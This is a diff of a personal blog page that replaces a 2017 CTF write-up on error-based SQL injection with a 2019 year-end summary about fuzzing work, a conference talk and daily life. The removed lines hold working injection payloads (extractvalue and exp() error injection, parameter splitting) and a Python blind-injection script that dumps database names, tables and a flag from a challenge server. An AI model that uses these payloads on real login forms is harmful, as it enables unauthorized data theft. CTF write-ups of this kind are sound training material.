@@ -15,7 +15,7 @@
     <meta name="description" content="incisive expression">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>实验吧加了料的报错注入 · n3k0</title>
+    <title>2019年度总结 · n3k0</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -207,7 +207,7 @@
                 <a href="/" >NEKO</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">实验吧加了料的报错注入</a>
+                <a href="#" class="post-name">2019年度总结</a>
             </div>
     </div>
     
@@ -239,7 +239,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            实验吧加了料的报错注入
+            2019年度总结
             <!-- 404 -->
             
         </h1>
@@ -255,15 +255,9 @@ height:50vh;
         
             <!-- 文章页标签  -->
             
-                <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
-    
-</div>
-            
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2017/12/28</span>
+                <span class="post-intro-time">2019/12/30</span>
                 
                 
             </div>
@@ -372,14 +366,20 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p><a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
-<p>and,or,regexp,’,/,*,等都没被过滤<br>其实username过滤了()，password过滤了报错函数</p>
-<h1 id="http分割注入"><a href="#http分割注入" class="headerlink" title="http分割注入"></a>http分割注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; or extractvalue/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e)) or &apos;</span><br></pre></td></tr></table></figure>
-<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>password处可以盲注</p>
-<p>盲注有坑<br>首先字符集要这样写:<br><code>dic=&#39;!_{}@~&#39;+string.ascii_letters+string.digits+&#39;.&#39;</code><br>‘.’一定要放在最后，因为’.’可以匹配任何字符，如果出现了’.’就说明是不在字符集里的符号。<br>不能有<code>+</code>号，否则会返回<code>repetition-operator operand invalid&#39; from regexp</code><br>这里特殊符号要放在最前面，因为数据库名是<code>error_based_hpf</code>有个or，检测or后面的时候由于这里使用的regexp，如果<code>d</code>在<code>_</code>前面的话就会出现ord，而ord被过滤了，error_status就不是<code>Login failed</code>了，不过也可以把<code>Sql injection detected</code>当做另一个判断条件。<br>当然也可以找到correct_status,这里给出两种方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;password=or 1 regexp 1 or &apos;</span><br><span class="line">username=&amp;password=&apos; or (select database() regexp &apos;e&apos;) or &apos;</span><br><span class="line">(之前的盲注是能看到数据库前几位的)</span><br></pre></td></tr></table></figure></p>
-<p>当然改个字符集就能完事了。</p>
-<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">dic=&apos;!_&#123;&#125;@~&apos;+string.ascii_letters+string.digits+&apos;.&apos;</span><br><span class="line">error_status=&apos;Login failed&apos;</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  &quot;http&quot;: None,</span><br><span class="line">  &quot;https&quot;: None,</span><br><span class="line">&#125;</span><br><span class="line">url=&apos;http://ctf5.shiyanbar.com/web/baocuo/index.php&apos;</span><br><span class="line"></span><br><span class="line">def crackdatabase():</span><br><span class="line">    strs = &apos;&apos;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for j in dic:</span><br><span class="line">            data = &#123;&quot;username&quot;: &apos;&apos;,</span><br><span class="line">                    &quot;password&quot;: &quot;&apos;or ((select database()) regexp &apos;^%s&apos;) or &apos;&quot; % (</span><br><span class="line">                    strs + j)&#125;</span><br><span class="line">            r = requests.session().post(url=url, data=data, proxies=proxies).text</span><br><span class="line">            if error_status not in r:</span><br><span class="line">                strs += j</span><br><span class="line">                print(strs)</span><br><span class="line">                break</span><br><span class="line">#error_based_hpf</span><br><span class="line"></span><br><span class="line">def cracktable():</span><br><span class="line">    strs = &apos;&apos;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for j in dic:</span><br><span class="line">            data=&#123;&quot;username&quot;:&apos;&apos;,&quot;password&quot;:&quot;&apos;or ((select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema regexp database()) regexp &apos;^%s&apos;) or &apos;&quot;%(strs+j)&#125;</span><br><span class="line">            r=requests.session().post(url=url,data=data,proxies=proxies).text</span><br><span class="line">            if error_status not in r:</span><br><span class="line">                strs+=j</span><br><span class="line">                print(strs)</span><br><span class="line">                break</span><br><span class="line">#ffll44jj@users</span><br><span class="line"></span><br><span class="line">def crackcolumn():</span><br><span class="line">    strs = &apos;&apos;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for j in dic:</span><br><span class="line">            data=&#123;&quot;username&quot;:&apos;&apos;,&quot;password&quot;:&quot;&apos;or ((select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;) regexp &apos;^%s&apos;) or &apos;&quot;%(strs+j)&#125;</span><br><span class="line">            r=requests.session().post(url=url,data=data,proxies=proxies).text</span><br><span class="line">            if error_status not in r:</span><br><span class="line">                strs+=j</span><br><span class="line">                print(strs)</span><br><span class="line">                break</span><br><span class="line">#value</span><br><span class="line"></span><br><span class="line">def dump():</span><br><span class="line">    strs = &apos;&apos;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for j in dic:</span><br><span class="line">            data = &#123;&quot;username&quot;: &apos;&apos;,</span><br><span class="line">                    &quot;password&quot;: &quot;&apos;or ((select group_concat(value separator &apos;@&apos;) from ffll44jj) regexp &apos;^%s&apos;) or &apos;&quot; % (</span><br><span class="line">                    strs + j)&#125;</span><br><span class="line">            r = requests.session().post(url=url, data=data, proxies=proxies).text</span><br><span class="line">            if error_status not in r:</span><br><span class="line">                strs += j</span><br><span class="line">                print(strs)</span><br><span class="line">                break</span><br><span class="line">#flag&#123;err0r_b4sed_sqli_._hpf&#125; 猜测出.为+</span><br></pre></td></tr></table></figure></p>
-<h1 id="exp报错"><a href="#exp报错" class="headerlink" title="exp报错"></a>exp报错</h1><p>然而右边并没有过滤exp<br>exp报错适用于sql版本5.5.5以上<br>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username=&amp;password=&apos;or exp(~(select*from(select database())x)) or &apos;</span><br><span class="line"></span><br><span class="line">username=&amp;password=&apos;or exp(~(select*from(select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema regexp database())x)) or &apos;</span><br><span class="line"></span><br><span class="line">username=&amp;password=&apos;or exp(~(select*from(select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;)x)) or &apos;</span><br><span class="line"></span><br><span class="line">username=&amp;password=&apos;or exp(~(select*from(select group_concat(value) from ffll44jj)x)) or &apos;</span><br></pre></td></tr></table></figure></p>
+        <p>当不想工作时，随便写点东西，装作在工作就可以了。                —- 节选自《n3k0物语》第7章第3节</p>
+<p><hr><br>年底了，也冒个泡总结一下今年，表示n3k0并没有go die。<br>最近的风大的离谱，多亏好吃懒做的习性让我多长了几斤肉，勉强可以行走。<br>虽然感觉自己早就是个社畜，但真正成为社畜还是在今年中旬。<br>一到年底，就感觉松懈了许多，前段时间写了不少东西，现在感觉有点写不动了(只是懒而已)，虽然好多想法还没实现，好多进度还在搁置，可这突然而来的安心感和懒惰又是怎么回事…<br><img src="https://i.loli.net/2019/12/30/PQrTDYot4su6gJb.png" alt="image.png"></p>
+<p><hr><br>四月份前还在南京赛宁实习，说实话在赛宁学到了很多东西，虽然现在看来，那时候的我也属实菜逼，只不过啥都懂一点罢了，没有什么过人之处，但也比刚来那会连Docker都没用过强多了。四月中旬从赛宁离职，走的很突然，主要还是不知道怎么和大家道别，但是icecolor这个逼人整天催我：来不来啊，来不来啊，到底还来不来啊，快点吧…，mdzz。<br>现在好像大家都过得还不错，真心希望大家以后过得更好。</p>
+<p><hr><br>之后来到天津这边一个央企实习，来的时候还给我整了个编制，之后好久才搞明白这公司复杂的编制系统，这编制貌似还挺好，但我来了一段时间后就没打算在这长待了，也没怎么在乎。之后一直和icecolor搞一个无线fuzz的项目，六月份回了几趟学校，把毕业的事弄完了。</p>
+<p><hr><br>七月在天津这边正式成了社畜，之后一直在研究wifi fuzz，那时候没啥事压着，搞得挺爽，算是把wifi fuzz整个流程系统给做出来了，即使现在看来也挺满意，算是给这个框架定了个型。<br>然后有一段时间一直在怼汽车，然而我现在都不会开…<br><img src="https://i.loli.net/2019/12/30/ZisDtEqwGdNyKpS.png" alt="image.png"></p>
+<p><hr><br>八月底和icecolor去新加坡的hitb讲了一波，说实话这波给我整了个心理阴影，即使现在都不太想回忆一些细节，2个英语菜逼给一群老外讲东西，那可是货真价实的Chinglish。尤其某个逼英语水平比我还烂地tm离谱，我在下面听他讲，那他妈的，是真地想找个地缝钻进去。<br><img src="https://i.loli.net/2019/12/30/MzrHlqCimDy1nsN.png" alt="image.png"></p>
+<p>不过新加坡是真的名副其实的旅游城市，也充满了资本主义的气息，网红雪糕也是真的好吃。<br><img src="https://i.loli.net/2019/12/30/76bpN1QqsDOX28P.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2019/12/30/7WdtbhINuVfOoZT.png" alt="image.png"></p>
+<p><hr><br>之后大部分时间都在搞蓝牙，虽然有Defensics参考(我是没咋用)，但也搞得挺艰难的，当时连续搞了一个问题，整整一个星期没进度，心态爆炸，最后还是机缘巧合才搞定。最初只是上层协议fuzz，现在也算是底层也能搞了，一些东西也能绕了，最初系统化写的蓝牙fuzz框架也被我否定完了，但就是没抽出时间把蓝牙这块重新系统化得整一波。</p>
+<p><hr><br>然后一直到最近都是在完善wifi fuzz的一些东西，虽然搞了挺久，但还是会发现一些新东西，也挺有意思的。</p>
+<p><hr><br>在天津的生活还算悠闲，5点下班，有着充实的娱乐生活，业余时间把女神异闻录5打了一遍，但最后的boss不想打了，明年5r要出，直接玩5r吧。Nier:Automata算是正式通了关，当初在学校用电脑玩盗版，如今算是还了愿(我永远爱着2B.jpg)。战神3没玩下去，最近在玩鬼泣5，然后我意识到自己是真的手残。<br>平时自己也学会了买菜做饭(虽然只会下面条)，一个人的生活简直完美。<br><img src="https://i.loli.net/2019/12/30/onMSyIg4KJBivpZ.png" alt="image.png"><br><img src="https://i.loli.net/2019/12/30/t1B457TQ2GxOFNd.png" alt="image.png"></p>
+<p>话说现在这种情况挺适合养猫的，可现在还是不算安稳，等买了房有了车再养比较好，但那时候肯定没有现在这么悠闲了吧，说不准等我退休成老头的时候才能养猫。</p>
+<p><hr><br>今年收获挺大，最重要的是明确了自己的方向，wifi，bluetooth，ble会继续搞下去，即使wifi的fuzz现在看来做的很满意，但将来回头再看的时候，也会觉着自己写了一坨shit吧…毕竟这种感觉已经经历了几次了。其余的协议也有不少想搞的(总的来说就是想自己写一个Defensics)，想法太多，细节也太多，反而导致不知道搞什么了，可能我就是想放个长假玩一波。</p>
+<p>明年的路啊，明年再说。</p>
 
     </article>
     <!-- license  -->
@@ -387,7 +387,7 @@ height:50vh;
         <div class="license-wrapper">
             <p>原文作者: n3k0
             
-            <p>发表日期: <a href="https://kuraraneko.github.io/2017/12/28/实验吧加了料的报错注入/">December 28th 2017, 12:59:42</a>
+            <p>发表日期: <a href="https://kuraraneko.github.io/2019/12/30/2019年度总结/">December 30th 2019, 2:36:57</a>
             <p>发出嘶吼: 没有魔夜2玩我要死了</p>
         </div>
     
@@ -395,17 +395,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2017/12/30/CTF图像处理/" title= CTF图像处理 >
-                    <div class="nextTitle">CTF图像处理</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2017/12/27/我的pycharm突然没法使用requests了/" title= 关于一些乱七八糟的毛病 >
-                    <div class="prevTitle">关于一些乱七八糟的毛病</div>
+                <a href= "/2018/12/18/swpuctf-wp/" title= swpuctf-wp >
+                    <div class="prevTitle">swpuctf-wp</div>
                 </a>
             
         </li>
@@ -513,7 +508,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http分割注入"><span class="toc-number">1.</span> <span class="toc-text"><a href="#http&#x5206;&#x5272;&#x6CE8;&#x5165;" class="headerlink" title="http&#x5206;&#x5272;&#x6CE8;&#x5165;"></a>http&#x5206;&#x5272;&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔盲注"><span class="toc-number">2.</span> <span class="toc-text"><a href="#&#x5E03;&#x5C14;&#x76F2;&#x6CE8;" class="headerlink" title="&#x5E03;&#x5C14;&#x76F2;&#x6CE8;"></a>&#x5E03;&#x5C14;&#x76F2;&#x6CE8;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp报错"><span class="toc-number">3.</span> <span class="toc-text"><a href="#exp&#x62A5;&#x9519;" class="headerlink" title="exp&#x62A5;&#x9519;"></a>exp&#x62A5;&#x9519;</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
